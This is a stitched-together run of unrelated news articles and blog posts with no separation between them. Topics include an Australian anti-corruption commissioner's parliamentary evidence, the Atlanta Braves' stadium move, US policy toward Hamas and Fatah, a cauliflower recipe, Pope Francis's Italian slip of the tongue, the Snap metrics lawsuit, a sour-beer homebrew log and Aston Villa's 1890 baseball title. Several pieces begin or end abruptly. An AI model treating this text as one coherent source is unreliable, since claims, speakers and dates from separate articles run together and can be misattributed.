Independent Commission Against Corruption (ICAC) commissioner Megan Latham is giving evidence before a parliamentary committee inquiry into Inspector David Levine's scathing report, which described the ICAC's ill-fated Cunneen probe as the "low point" in the organisation's history.
In her opening statement, Ms Latham told the inquiry that the report was so flawed it should be withdrawn or disregarded.
"The report is so lacking in a proper factual foundation and infected by a denial of procedural fairness, that it should be withdrawn ... or that the committee place no reliance upon it," Ms Latham said.
It found that it was "unreasonable" for the ICAC to conduct Operation Hale, an investigation into whether Ms Cunneen encouraged her son's girlfriend to fake chest pains to avoid a breath test after a crash.
But Ms Latham hit back, accusing Mr Levine of failing to meet his legal obligation to provide procedural fairness to the commission.
The report prompted calls from some quarters for Ms Latham's resignation.
Today she told the hearing that the ICAC had submitted two volumes of documents, which were given to the Inspector before he wrote his report.
Ms Latham said the documents showed that the Inspector had reached unreasonable conclusions in his report, and that the material should be publicly released.
"The volumes include information that should have been taken into account, they undermine the basis for the adverse findings in the report," she said.
"They address speculative false claims to which the commission has not been able to lawfully respond and the failure to publish the material will continue to unfairly damage and undermine public confidence in the commission."
The material that the commissioner handed to the inquiry includes Crime Commission phone taps, which were among the material the ICAC assessed when it made the decision to start investigating Ms Cunneen.
The parliamentary inquiry adjourned until next week to decide whether Crime Commission phone taps and other material submitted by the ICAC should be released to the public.
Ms Latham will be recalled to answer questions on February 19 and the other witnesses scheduled today, including Mr Levine, will also give evidence that day.
After the report was released last year, Ms Cunneen's close friend, Jeffrey Phillips SC, said it should have serious consequences for both the ICAC and its commissioner.
"I would have thought the Government and Premier [Mike] Baird now have to consider whether this organisation has now gone so far outside its orbit to be almost considered a rogue organisation," he said.
However others, including former ICAC commissioner Anthony Whealy QC, expressed concern that it revealed a toxic relationship that undermined the report's credibility.
"I have to say that some of the inspector's language is so vehement that it tends to take away from the objectivity of the report," Mr Whealy said.
This is the second time Ms Latham has been called before the parliamentary committee to be grilled about the investigation into Ms Cunneen.
Last year the commissioner clashed with the committee's Liberal chairman Damien Tudehope when she refused to answer questions, saying it was beyond the committee's powers.

ATLANTA (Reuters) - The Atlanta Braves will leave Turner Field, their downtown home that is not yet two decades old, for a new $672 million county stadium partially funded by taxpayers, the team said in a surprise announcement on Monday.

The new ballpark, which the Major League Baseball team wants to be ready for its spring 2017 opening day, will be located 12 miles north of Turner Field, built for the 1996 Olympic games and renovated for the Braves by the following season.
Atlanta Mayor Kasim Reed said the city was unwilling to put up the hundreds of millions in tax dollars needed to keep the Braves downtown.
“It is my understanding that our neighbor, Cobb County, made a strong offer of $450 million in public support to the Braves, and we are simply unwilling to match that with taxpayer dollars,” he said in a statement.
Turner Field, named for media mogul and former team owner Ted Turner, needs $150 million in renovations, including new seats and upgraded lighting, the Braves said.
It also lacks adequate parking and the team has no control over development around it, according to the Braves.
The new stadium will be near the intersection of two major interstates in Cobb County.
“We believe the new stadium location is easy to access, while also giving our fans a first-rate gameday experience in and around the ballpark and making it a 365-day-a-year destination,” said Atlanta Braves President John Schuerholz.
The site also will include land for retail, restaurants and hotels, the team said.
The Braves said the county will invest in the stadium but did not say how many taxpayers would shoulder. The exact source of Cobb County's public funding has not yet been finalized, said county spokesman Robert Quigley.
Baseball Commissioner Bud Selig said the league was kept apprised of the Braves' plans and supported the move.
The Braves said they would not renew its lease with the city of Atlanta and Fulton County Recreation Authority when it expires at the end of 2016.
Reed said the city would work during the next three years with prospective partners to redevelop the Turner Field area.
Google's original Nexus 10 is more than a year old. It was released in November 2012, at that time offering the highest display resolution of any tablet (2560 x 1600 pixels). In December 2013 we heard about a new-generation Nexus 10 that was supposed to be unveiled on Cyber Monday. That did not happen.Now, with CES 2014 starting in just a few days, Taiwanese website DigiTimes reports that Google “is expected” to announce its new Nexus 10 at the trade show in Las Vegas. Like the first generation 10-inch Nexus, the new one is supposedly also manufactured by Samsung. There is no word on what features it will have, but the screen might be an AMOLED one, while the pixel resolution is likely going to remain unchanged. Also, the latest Android 4.4 KitKat is pretty much a given.Of course, since DigiTimes has a hit-and-miss track record, the new Nexus tablet may not be revealed at CES after all.DigiTimes also mentions other companies that could announce tablets at CES 2014 in Vegas: Lenovo may bring a new-generation Yoga tablet, Asus is expected to unveil a dual-boot (Android + Windows) tablet plus a Padfone, while LG could also showcase something new. We'll let you know what happens after CES 2014 kicks off.source: DigiTimes
Israel and the United States believed that by depriving the PA of the funds it needed to pay workers and dispense welfare, it could bring down the government. Abbas would call new elections and this time Fatah would win. But Israel and America's strategy backfired. By denying the PA funds, it initially crippled Abbas and Fatah's patronage base and security force. Hamas, meanwhile, whose sources of funding in the United States were drying up because of federal prosecution, turned to Iran for support, and Iran's funding allowed Hamas to pay its fighters and to maintain its own system of clinics and schools. Hamas retained its political support, while Fatah continued to lose ground.
In November 2006, with civil war already breaking out in Gaza between Hamas and Fatah, Lieutenant General Keith Dayton, whom Bush had appointed the U.S. security coordinator for the Palestinians, met with Muhammed Dahlan, a Gazan who was Fatah's security chieftain. According to Rose's account in Vanity Fair, which draws upon notes taken during the meetings, Dayton urged Dahlan to “build up your forces in order to take on Hamas,” and promised $86.4 million in aid. Two months later, an administration spokesman reported, Bush instructed Secretary of State Condoleezza Rice to transfer “about $86.4 million in aid to help Palestinian security forces under President Mahmoud Abbas's direct control … to help provide law and order in Gaza and the West Bank, fight terror, and to facilities movement and access especially in Gaza.” That announcement, combined with an announcement from Fatah that Dahlan would be financing a “security and protection force” in Gaza, further enflamed the conflict between Hamas and Fatah.
Congress balked at the $86.4 million grant—in part because some members didn't want to send any military aid to the Palestinian Authority and in part because some thought the aid would end up in Hamas's hands. Congress finally agreed to $59 million in non-lethal aid, but the Bush administration tried to get around Congress by seeking lethal aid from Egypt, Saudi Arabia, Jordan and the United Arab Emirates. In December, Egypt had already begun sending military aid to Fatah in Gaza. That effort sparked a fierce debate among neo-conservatives, some of whom, like Wurmser, believed that the United States would end up provoking a Hamas takeover. Wurmser told me that he opposed the plan to arm Fatah in order to defeat Hamas. The administration, Wurmser said, “was engaged in an effort to help Abu Mazen [Mahmoud Abbas]—a corrupt dictator—to stay in power.”
Abbas, alarmed by the growing violence in Gaza, had periodically urged a unity government. So did de Soto in Quartet meetings, but de Soto got no support from the United States. According to de Soto, Assistant Secretary of State for Near Eastern Affairs David Welch, who, along with Abrams, were the point men for the U.S. policy, told him in January 2007, “I like this violence. It means that other Palestinians are resisting Hamas.” But in February, the Saudis surprised the Quartet members by bringing Hamas and Fatah leaders to Mecca for unity talks that resulted in an agreement between the two sides establishing a new government. The government included prominent Fatah and Hamas officials as well as several academics and policy experts, including Salam Fayyad, who were not at that point aligned with either faction. The two sides agreed that Hamas would handle domestic matters and Fatah and the independent experts international affairs, including negotiations with Israel.
Abrams makes no mention of these concessions in his book, but they were widely reported at the time. As recounted in award-winning Australian journalist Paul McGeough's history of Hamas, Hamas leader Khalid Mishal, who led the negotiations, reasserted Hamas's opposition to the state of Israel, but agreed to abide by past treaties between the PLO and Israel, including the Oslo accords, and to support negotiations for a two-state solution. “Hamas is adopting a new political language,” he said afterwards. “The Mecca agreement is a new political language .. and honoring the agreements is a new language, because there is a national need and we must speak a language appropriate to the time.”
The U.S. and Israel, however, refused to deal with the new government, and according to Rose and McGeough, pressed ahead with its plans to force Hamas out of the government. Abbas was convinced to name Dahlan, whom Hamas saw as its enemy, as the new security chief in the cabinet. And the United States sought to develop a new “action plan” with Abbas and Fatah that would lead by the year's end to Hamas's removal. In the months after the Mecca agreement, fighting had abated in Gaza, but on April 30, the Jordanian newspaper Al-Mayd published a leaked 16-page draft of the action plan, which did not emphasize military means, but did include the need for a military buildup. The Jordanian government confiscated the issues before they got on the streets, but the text remained on Al-Mayd's website, and was widely disseminated.
Hamas interpreted the plan accurately as a conspiracy to block the Mecca agreement and to remove it from power. Then two weeks after the plan surfaced, new Egyptian trained and armed Fatah forces arrived in Gaza with Israel's approval. The fighting in Gaza resumed. Then on June 7, Ha'aretz reported that Fatah officials in Gaza has “asked Israel to allow them to receive large shipments of arms and ammunition from Arab countries, including Egypt.” Ha'aretz also reported that Dahlan was organizing another paramilitary force in Gaza to fight Hamas. At this point, Hamas, who had already lost 250 fighters that year, took the final step and drove the Fatah forces out of Gaza and took control of its government. Wurmser told Rose, “It looks to me that what happened wasn't so much a coup by Hamas but an attempted coup by Fatah that was pre-empted before it could happen.” Wurmser, who left the Bush administration a month later, told me he still stands by this judgment.
On June 13, two days before Hamas took over, American Ambassador to Israel Richard Jones sent a cable recounting conversations he had at the time with Israeli Shin Bet head Yuval Diskin and Military-Intelligence Chief Amos Yadlin. The cable, which Wikileaks released in 2010, confirms parts of the alternative narrative. Diskin told Jones that he opposed American proposals to supply weapons and ammunition to Fatah, because he feared that Hamas would get their hands on them. He also told Jones of Fatah's request that Israel attack Hamas. “They are approaching a zero-sum situation, and yet they ask us to attack Hamas," Diskin told Jones. "This is a new development. We have never seen this before. They are desperate."
On the same day, Jones sent another cable describing a conversation he had the previous day with Military-Intelligence Chief Amos Yadlin. The Israeli Defense Forces had earlier been eager to help Fatah against Hamas, but when Jones spoke to Yadlin on the eve of Hamas's takeover, Yadlin said he was actually “happy” with the prospect that Hamas would gain control of Gaza. He thought that Israel could then treat Gaza as a “hostile territory.” And several weeks after Hamas's takeover in Gaza and Abbas's ouster of Hamas officials from the Palestinian Authority in Ramallah, Israel's cabinet did declare Gaza a “hostile territory.” And in a 2010 article, Ha'aretz revealed that during Operation Cast Lead in December 2008, Israel's Defense Minister asked Fatah's leadership whether it wanted to take back control of Gaza after Israel had ousted Hamas. That operation ended badly, of course, for Israel and its government.
If the alternative narrative to Abrams' is plausible, and I believe it is, what are the lessons to be drawn? The first, and most obvious, is that the Bush administration was utterly incompetent at foreign policy. That clearly goes for Bush's second as well as his first term. And in the case of its policy toward Israel and the Palestinians, it is not just Abrams and the White House that is to blame, but the State Department under Condoleezza Rice. Nothing they did—from urging elections on the Palestinian Authority to attempting to oust Hamas from the PA—achieved what they hoped. They were constantly being upended by events that they had not foreseen—from Hamas's victory in January 2006 to the Saudi's Mecca agreement in February 2007 to the Hamas takeover in June 2007.
The second, having to do with American policy toward Hamas, is more complicated and controversial. In the 1990s, the Clinton administration had good reason to try to isolate and sanction Hamas, which was using suicide bombers to undermine the Oslo Accords between Israel and the PLO. But by 2006, the situation had changed. Oslo was, to all intents and purposes, dead. Fatah and Abbas were unpopular, and in participating in the 2006 elections, and in occasional statements, Hamas had shown some willingness to let the PLO negotiate with the Israelis and to a long-term “hundna” or ceasefire with Israel. The Bush administration had at its disposal all kinds of circuitous means of dealing with Hamas without directly recognizing a organization that the State Department had designated as “terrorist.” For one thing, as de Soto suggested, it could have acted through the Quartet.
Instead, the administration joined the Israelis in doing everything it could not only to isolate but to defeat and destroy Hamas, even though Hamas had won elections that the Bush administration had urged. At this point, the administration's strategy recalled earlier failed attempts of American administration to deny the existence of regimes and movements of which it did not approve. By refusing to deal with, or attempting to destroy, movements or governments that have genuine popular support, and that were not at war with the United States, the United States has almost invariably strengthened those movements and governments, and in some cases, removed the possibility that they could have been brought around. There is no question that the American and Israeli strategy against Hamas strengthened that movement, deepened its support, and also hardened its ties to a country, Iran, that both the US and Israel see as hostile.
American or Israeli politicians who back the idea of a “greater Israel” that incorporates lands that the Jews inhabited several millennia ago might agree with Yadlin's judgment that Hamas's takeover in Gaza boded well for Israel. But it would be hard for anyone who backs a two-state solution to the Israeli-Palestinian conflict to agree. Hamas remains a force in the West Bank as well as Gaza, and as Halevy and other prominent officials have contended, would eventually have to be brought into any viable peace agreement between Israel and the Palestinians. That should have been clear during Bush's misadventure in his second term, but the lesson seems not to have been learned.
While Obama sought initially to press Israel to conclude an agreement with the Palestinians, he continued to harbor the illusion that it could be done while pretending that Hamas does not exist. Obama also followed the Bush administration in rejecting the idea of a unity government between Hamas and Fatah when the two parties again agreed to reconcile early last year. The agreement fell apart—and not least because of an absence of American support. Will Obama change course in his second term and attempt to deal with Hamas and Fatah? In Obama's State of the Union address, he managed to mention Israel's security, but not the peace process or the Palestinians. Evidently, the administration is now denying the existence not only of Hamas, but of Abbas and the Palestinian Authority. That suggests that the lessons of Bush's disaster in Gaza have still not sunk in.
This baked General Tso's Cauliflower is every bit as delicious as the fried version. It's quick and easy to make and is a super delicious vegan + paleo meal.
The first time I told my handsome man we were having General Tso's Cauliflower for dinner, his response was, “That's it?” I watched his face turn from confused to desperate as I confirmed that dinner would be cauliflower and rice. No meat. No other veggies.
I turned down pleas to add some peppers or onions or A.N.Y.T.H.I.N.G. else to the pan. Not that some extra veggies are a bad idea, but this baby's all about the cauliflower.

What happened to his face after the first bite was nothing short of a transformation. He declared that it was the best cauliflower he'd ever eaten. He started talking about opening a restaurant that sells only General Tso's Cauliflower. He told me we (read: I) need to make this every week from now on.
The guy's got a point, this is some damn good cauliflower.
I've been wanting to make General Tso's Cauliflower for a while, but I've only ever seen recipes that call for deep frying the cauliflower first. I don't have anything against deep frying veggies (have you tried Najib's Lebanese Cauliflower yet?) but I wanted something a little healthier.
Rather than pulling out a pot of oil I used a little trick to make the cauliflower taste like it's been deep fried when really it's baked …
By coating the cauliflower in a little corn starch before you bake it, you'll get cauliflower that is a little crispy and very much like the deep fried version.
It tastes sinfully delicious without piles of calorie heavy oil.???
And then there's the sauce. We need to go here for a minute, or ten. The other thing I heard from my handsome man, between mouthfuls of General Tso's Cauliflower, is that we need to bottle this sauce and put it on everything. The guy's got a point.
It's sweet with the tiniest bit of tangy and it practically begs you to lick every last drop of it off of your plate. It also winds its way around each piece of cauliflower and sticks in all the grooves. With each bite of cauliflower, you'll a delicious spoonful of the sauce, too.
This meatless Monday dinner is 1000x better than any Chinese takeout, and almost just as easy. You will love it!

Pope drops the F-bomb: Pontiff gets his Italian mixed up during Sunday blessing
Argentinian said 'cazzo' in Italian instead of 'caso' which means 'example'
Within seconds, his error was posted online and quickly went viral
Many said it was a common slip and emphasised him as a 'man of the people'
With millions of people hanging on your every word, it was a slip-up Pope Francis would really have preferred not to make.
While giving his weekly blessing from the Vatican, the Argentinian mistakenly uttered the word 'f***' in Italian before quickly correcting himself.
But within seconds his mistake was posted on dozens of Italian media websites and YouTube and had gained millions of worldwide hits as it went viral.
The words the Pope stumbled on were 'caso' (example) and 'cazzo' which means 'f***' in Italian and often trips up those not used to speaking the language.

Slip of the tongue: Pope Francis accidentally uttered the word for 'f***' in Italian while giving his weekly sermon from the window of his apartment at the Vatican's Apostolic Palace (above) Lost in translation: The words the Argentinian stumbled on were 'caso' (example) and 'cazzo' which means 'f***' in Italian which often trips up those not used to speaking the language
In his sermon, the 77-year-old Pope had been urging for a peaceful solution to the crisis in Ukraine.
Speaking from the window of his apartment at the Vatican's Apostolic Palace, he said: 'It is my wish that all the components of the country will endeavor to overcome misunderstandings and build together the future of the nation.
'I make a heartfelt appeal to the international community to support every initiative on behalf of dialogue and harmony.
'A heart full of longing for possession is a heart empty of God.
Perils of the digital age: Pope Francis maintained his composure and quickly corrected himself in front of the crowd gathered in St Peter's Square (above), but within seconds his error had gone viral online
'For this, Jesus many times chastised the rich because the risk for them to seek security in the wealth of this world is high.
'In this f***, in this case the providence of God is made visible as gesture of solidarity.'
Pope Francis maintained his composure despite the slip, quickly correcting himself, as the crowd gathered in St Peter's Square and those watching around the world asked themselves 'Did he just say f***?'
On the internet, the slip-up generated hundreds of comments with many explaining that it was a common mistake made by Spanish speakers and others said it underlined their impression of him as a 'man of the people.'
Since his election last year, Pope Francis has shown himself to have the popular touch as he shuns the normal trappings of a pontiff, preferring to live in modest Vatican hostels for priests and he has been happy to pick up the telephone and call Catholics from all walks of life who have written to him.
His warm and approachable style led him to being named Time magazine's Person of the Year and later this month he will celebrate the first anniversary of his election as Pope.
For anyone who's interested, here's the table of contents for Onto-Cartography. I'm about 2/3rds of the way through editing it and should, with luck, send it to Edinburgh this week.

What we really need, Congressman Ron Paul said in respect of the Fed when we spoke with him on the phone this morning, is a Wikileaks episode. He wasnt in any way suggesting that literally  or recommending any other kind of illegal raid on the Feds books; all his points favor acting only in lawful ways. What he was underlining is that the big document disclosure from the Fed is just the tip of the iceberg of what the public needs, and deserves, to know about what our nations central bank is doing.
The documents that have been released were disclosed by the Fed in the face of an array of pressures  from Bloomberg News, among others, and from the Congress, spurred by the socialist senator from Vermont, Bernard Sanders, against the backdrop of Congressman Pauls years long quest for some sunlight on the Fed. The disclosures show a vast rescue by the Fed of all sorts of institutions. Santa Clause: Fed Aid Went All Over; Companies, Banks, Offshore is the headline the Drudge Report put on the story.
Its quite a spectacle. The Fed disclosed 21,000 transactions in its multi-trillion emergency lending program. It turns out that the then-triple-A-rated General Electric was getting bailed out without any disclosure being made by its broadcasting arms, even while theyre covering the Fed and the debate over the bailout. So vast was the borrowing by foreign banks that Senator Sanders was quoted by the Financial Times as asking: Has the Federal Reserve of the United States become the central bank of the world?
One analyst, Karen Shaw Petrou of Federal Financial Advisers, was quoted by the Washington Post as saying the disclosure shows how really profound the financial crisis was in the fall of 2008 and the firepower the Fed mustered in response. But a former aide of the Atlanta Fed, Robert Eisenbeis, now chief monetary economist at Cumberland Advisors, told Bloomberg Television that its not clear that you get a real picture about the severity of the financial crisis from these data.
He elaborated on the point this way: When you drop money out of a helicopter on Wall Street, rational people pick it up, and you know theres a question about how much was needed. One point Mr. Eisenbeis cited was the disclosure by the Fed that among the companies it bailed out was the motorcycle maker Harley-Davidson. Its hard to argue, he noted, that thats a systemically important firm  may be to the motorcycle crowd, but certainly not from the broad base of the United States economy.
Mr. Eisenbeis said there shoud be a strong forensic team  an outside group  to go in and look a vast Fed bailouts and do an analysis the way it was done after, say, the failure of Lehman Brothers. His comments were but an example of the logic of a proper, public, outside audit of the Fed, which has long been sought by Congressman Paul. His quest for a full audit may have gotten lost in the compromise of the Dodd-Frank legislation, but it is asserting itself. It is something that the poor suffering taxpayers, who are looking at all this with a sense of horror, will look to the 111th Congress to require.
* * *
The logic is for such an audit to go way beyond the workings of the alphabet soup of various rescue lines opened up by the Fed. The real issue is the much larger question  how is the Federal Reserve conducting monetary policy and was our system of fiat money, in and of itself, a cause of the Great Recession? Or, to put a more forward spin on it, the question that is really asserting itself is whether monetary reform is the route to getting us out of the current morass and returning us to a path of stable growth. Its an encouraging thing that Dr. Paul is in line to chair the subcommittee in Congress that has primary oversight of the Fed. If he gets the post hes in line to get wed like to think the American people will start to get some answers.
Building your own airplane can be a daunting task and one of the trickiest parts is to properly assemble the avionics equipment and all the cables that go with it. Aircraft Spruce and Specialty Company has just started a program that makes this work much easier.
The company's harness assembly shop offers services ranging from a single avionics unit to coaxial cable assemblies and complete panel wiring systems for builders of experimental airplanes or owners of amateur built airplanes who wish to make avionics upgrades. Aircraft Spruce claims the assemblies are labeled neatly to simplify installation and the shop offers assemblies off the shelf as well as custom made harnesses.
Harness solutions are available for a long list of avionics manufacturers including Dynon Avionics, Garmin, Bendix King and PS Engineering.

Now in its sixth year (and third with results shared via Arctic Drones), the Post-rock Facebook page's Year's Best list offers a compacted view of the important releases of 2017 from around the globe. This is a genre that is growing ever-larger, but as it continues to function in a relatively niche market it remains important to offer listeners a focused overview of what releases most moved fans during the course of the year.
Post-rock Facebook page's nomination list that comprised this poll category featured nearly 400 releases (narrowed down from 800+) from mainly post-rock but also neighboring genres such as post-metal, ambient and math-rock, offering a dizzying spectrum of possibilities. Therefore, we strongly urge readers to look beyond those artists they are already familiar with and dig deep for new favorites to support through the coming years. More than 12,000 fans voted, so what you are seeing here should give you a solid base with which to operate off. Keep in mind also, a lot of votes were spread around, indicating a large volume of worthwhile releases to discover.
The results provide a balance of expected heavyweights and pleasant surprises. Bands like Mogwai and Godspeed You! Black Emperor, for instance, show why they have been continuously seated at the highest thrones of post-rock for the past 20 years. More recent favorites like And So I Watch You From Afar and sleepmakeswaves stake their claim to heavyweight status as well. But look beyond them and you'll find a wonderful tapestry of post-rock up-and-comers (Heron, Wander, Shipwrecks, PILLARS), young math-rock luminaries (Vasudeva), crushing post-metal acts (Terraformer, Glacier), and many more diverse and exciting artists.
Here it is – the top 50 releases of 2017 post-rock listeners most voted for. Be sure to check out ‘More Info' links under each entry to get more information on the bands and support them. A Spotify playlist link is also available at the end of this article. Enjoy! – Words by David Zeidler

It's hard to say whether America's higher-education system is fated for disintegration or disruption or demolition. But, as even Roth acknowledges, the landscape is shifting. Will students get the same quality training online as they get in-person? Will a college education be more accessible to more Americans while retaining its caliber? Will "cathedrals of learning" such as Yale still play the same role two decades from now as they did pre-Internet?
2U is a cloud-based software platform focused on higher education, with roughly a dozen university partners, including UC Berkeley, Syracuse, Northwestern, and many of the aforementioned institutions. It was 2U that first approached Yale proposing that it develop some sort of online degree program. James Van Rhee, the PA-program director, heard that the company was on campus, and after hearing about the possibilities he quickly latched onto the idea.
The reason Van Rhee is seeking to expand the PA program to the web is simple: Though PAs are in extremely high demand and command high salaries, many students are discouraged from pursuing the career because they don't want to move to a new campus to get their credentials, he said. According to the Bureau of Labor Statistics, job opportunities for PAs are expected to grow by 38 percent between 2012 and 2022. That increase works out to roughly 33,300 new positions, in large part because of the aging population and the increased prevalence of chronic disease, among other factors. Glassdoor, a popular online career resource, ranked PAs as No. 1 in its 2015 list of the "25 Best Jobs in America." And the mid-career median pay for PAs, according to Forbes, is $97,000.
Providing the same quality of training as Yale's on-campus program, the online coursework would reduce the financial burden and stress of relocating to New Haven, Van Rhee said: "They won't be away from their support systems. They'll be by their families, spouses, grandparents, siblings … For us not to move them away from that, it makes becoming a PA more enjoyable." It would also encourage PAs to learn and work in their local communities—often rural, underserved settings that are in greater need of these resources. "There are more than enough people who need healthcare around the country that don't have it," he said. "These students could fill that niche."
But a key question remains: Are students who attend class remotely receiving good-enough training? Or put another way, would the students who do the coursework online get more out of Yale if they were instead enrolled in the on-campus program? A growing percentage of college officials believe that students need more discipline to succeed in an online course than they do in a face-to-face setting, according to a new report by the Babson Survey Research Group, which surveyed more than 2,800 higher-education institutions in the U.S. In 2005, 56 percent of high-level college administrators said they believed the online courses require greater discipline; by 2014, that figure had grown to 69 percent of respondents. Student retention also appears to be a growing concern, with 45 percent of administrators responding in 2014 that online courses have a harder time retaining students than on-campus ones do, up from 27 percent in 2004.
“Allegiant” star Nadia Hilker has joined the cast of The CW's “The 100” in a recurring capacity, TheWrap has learned.
She will play a grounder, in what is described as an important role, though more details are being kept under wraps.
Hilker is currently set to appear in two episodes of the show's third season and there is speculation she could play the role of Luna, a character who has been mentioned by name on the show since Season 1 but has yet to be seen.

The series is centered on 100 juvenile delinquents who are sent down to a potentially toxic Earth to test its habitability, and stars Eliza Taylor, Bob Morley, Marie Averopoulos, Paige Turco, Henry Ian Cusick and Isiah Washington.
Grounders are the native Earth population the delinquents have encountered and had a complicated relationship with in their months on the ground.
“The 100” is based on the book series by Kass Morgan and is produced by Bonanza Productions Inc. in association with Alloy Entertainment, Warner Bros. Television and CBS Television Studios.
Jason Rothenberg created the show and is the executive producer. The show was recently renewed for Season 4.

Hilker is best known for playing the role of Nita in “Divergent” threequel “Allegiant,” and she'll reprise the role opposite Shailene Woodley in the franchise conclusion, “Ascendant.” She is represented by Management 360.
snapchat lawsuit metrics ceo evan spiegel
A lawsuit filed against Snap Inc. by a former employee claims the company reported false growth numbers to investors in an effort to inflate its valuation.
The plaintiff, Anothony Pompliano, joined the company (then known as Snapchat) as a growth lead in September of last year from Facebook. Pompliano claims the company's “institutional pandemic” of misrepresentation of its user numbers was fueled by its pursuit of a multi-billion dollar initial public offering (IPO) — a number of prior reports have claimed the company could go public as soon as March.

Snap's visual messaging app Snapchat is known for its popularity with younger millennials (aged 25 and under). Despite remaining tight-lipped about its official statistics, leaked reports put its daily active user base at 150 million (higher than that of fellow social platform Twitter). Additionally, its daily video views count hit an impressive 10 billion in April 2016. Numbers like these have had the industry buzzing over its expected IPO, with analysts claiming the company could be valued as high as $25 billion.

Pompliano alleges that execs from the firm lied to him about Snapchat's growth numbers (although the company did not have a user growth team in place to track its metrics). He also claims Snapchat CSO Imran Khan regularly misreported numbers to its backers, including during a bid to secure a $200 million investment from Chinese ecommerce giant Alibaba Group Holding Ltd. We reached out to Snap for a comment but did not immediately receive a response.

According to the suit, Snap never invested in building a growth and engagement team because its CEO Evan Spiegel didn't care about user metrics. It allegedly only made the move to hire Pompliano when it realized that a lack of key performance indicators could impact its IPO.
Pompliano's tenure at Snapchat lasted just three weeks. He claims that his employment was “unlawfully terminated” after he warned several execs at the company that their current practices had to stop. Afraid that Pompliano would “blow the whistle,” Snapchat let him go less than a month after he started the job, claims the suit.
Pompliano — who led the growth team for Facebook Pages for over a year before jumping ship — adds that during his time at Snap he was pressured to reveal confidential information regarding his former employer. Since being laid off, Pompliano claims Snap has sought to “destroy his career” by waging a “smear campaign” against him.
Large sections of the lawsuit filed in Los Angeles County Superior Court have been blacked out, including references to the exact figures that were allegedly inflated by Snap. Pompliano's attorney, David Michaels, told the Los Angeles Times the redactions are to protect information that is subject to a confidentiality agreement between his client and Snap. The company will now file to maintain the redactions, adds Michaels.
Pompliano is seeking an injunction against Snap to prevent it from making false representations concerning the details surrounding his termination. He has also filed a separate arbitration claim seeking damages for lost wages, harm to his professional reputation, and damages based on Snap's “wrongful” conduct.
Ever since my first taste of a sour beer I've been hooked on this tart nectar. My first experience with a sour was a New Glarus Belgain Red, this beer is a fantastic sour brown ale with tons of cherry flavor. As a typical home brewer I've been mortified of introducing bacteria and brett into my process. That being said I recently had a bottle of New Glarus Raspberry Tart with thanksgiving and decided it was time to put my cleaning and sanitation to the test. Plus I recently opened up my oak barrel, and decide it's time to inoculate it with bugs!
The idea behind this beer is something that straddles the line between a Flanders brown and red. I added a decent amount of caramunich to give the bugs some residual sugars to chew on over the next year.

Water Bru'n Water West Flanders Boiled
The Brew
I purchased water and malt the evening before my brew day. Using the Bru'n Water spreadsheet I modified the water profile to be similar to the Flanders profile. The next morning I heated my strike water and mashed in hitting my target mash temp within one degree.
For the next 60 minutes I weighed out my hop additions, made a pot of coffee and eggs, wished my wife a great day at work, and fed my dogs. By the end of the 60 minutes my mash PH was 5.2 and the temperature had dropped two degrees to 148. I collected the sweet wort which smelled amazing with the addition of a tiny amount of NB hops. I brought the kettle to a boil, set my timer and walked away. Since adding fermcap-s to my routine I've never had anything resembling a boil over.
During the boil I prepped for thanksgiving dinner which we were hosting this year! I baked a pie, made tom and Jerry mix, and brined a turkey.
Once the boil was over I chilled the wort down to pitching temp (80 degrees) within ten minutes thanks to my great immersion chiller, and put the fermenter in my chamber set at 80 degrees. Next up, I opened Pandora's box!
Fermentation began so quickly and was one of the most vigorous I've ever experienced.
10 hours post pitch.
24 hours post pitch.
After the beer had fermented for a week I pulled a sample to test the S.G. No surprise, based on the vigorous fermentation, the Gravity was already down to 1.010. We had some friends over and we tasted the sample. At this time the abbey ale, which I'm guessing is the main yeast strain in this mix, dominated the flavor. From White Labs site
“A unique blend perfect for Belgian style beers. Includes Brettanomyces, Saccharomyces, and the bacterial strains Lactobacillus and Pediococcus.”
We all agreed there were hints of tartness but nothing like the flavor I hope this will eventually attain.
With primary fermentation complete I plan on moving this carboy to a closet in my house for the next six months while the Brett and bacteria start to do their thing.
I will certainly update this post as the result roll in (pictures too!).
Results:
No cross contamination! Yay I survived my first foray into sour beers. I plan on brewing another soon using the Yeast Bay's melange blend.
Update: 1/8/16
Beer was racked to a 5 gallon glass carboy filled to the neck, placed in an upstairs closet insulated with a blanket. At this time the beer is quite sour which is quite exciting.
Update: 2/16/16
Beer has formed a pellicle in the neck of the carboy. Decided not to rack this to the oak barrel given how tasty it was at racking and not wanting to introduce more oxygen. Oak barrel was filled with the same recipe brewed with Wyeast Roeselare Blend.

MegaRide, an academic spin-off of UniNa honoured by Shark Bites at the National Innovation Prize with the title of innovative start-up of the year, has announced an exclusive partnership with the Ducati Team that will run until the end of the 2018 MotoGP season. The agreement will see MegaRide supply the team with its software, which predicts and simulates tyre behaviour, useful in evaluating grip and wear and allowing the team to define set-ups and race strategies in preparation for MotoGP rounds.
A partnership born thanks to technical/scientific collaborations that aim to achieve optimum performance through real-time simulation, the main field of application of MegaRide products. In Ducati it finds a partner that perfectly embodies the technological excellence and dynamism that have led the start-up to establish itself in international motorsport in such a short period of time.
"Understanding, simulating and monitoring the behaviour of the bike in real-time is key in order to gain a competitive advantage linked to maximising grip on different surfaces and in different race conditions”, stated Flavio Farroni, CEO of MegaRide who, along with colleagues Aleksandr Sakhnevych and Francesco Timpone, founded the academic spin-off just over a year ago, developing technologies for the motorsport and sport mobility sectors.
“Tyre management strategies are a key factor when it comes to achieving results in MotoGP racing, particularly in the last two years of continuous technological tyre evolution. The collaboration with MegaRide serves to strengthen the development of these strategies”, added Nicolò Mancinelli, Vehicle Dynamics Engineer at Ducati Corse.
This season is proving successful, with Andrea Dovizioso fighting for the title, having won races in Italy and Spain and having finished in the top five in 6 of the 9 races so far. This success has often come down to effective tyre management strategies, which look to minimise wear and fully exploit grip. MegaRide, also to thanks for the results achieved this year, has provided the Ducati Team will tool that help to analyze vehicle dynamics in an innovative way, optimising performance.

THE Aston Villa players who return to pre-season training tomorrow are more likely to have sported baseball caps than brandished baseball bats during their summer break.
Yet the close season activities of some of their predecessors more than a century ago were not so much Premier League as Major League, according to a fascinating new history book.
‘What about the Villa? Forgotten figures from Britain's pro baseball league of 1890' is Joe Gray's record of a unique achievement during the club's late 19th century glory years, pictured right.
For, just three years before the claret and blues became the “greatest football club in the world”, Villa were the only ever winners of a professional national baseball league in England.
After embarking on the exhaustive task of chronicling the historic title win Gray, a Villa fan at heart and statistician by trade, has unearthed a forgotten chapter of Villa history.
Villa were in danger of dropping out of the First Division when American entrepreneur Albert Spalding took Major League baseball players on a world tour which stopped off in Britain.
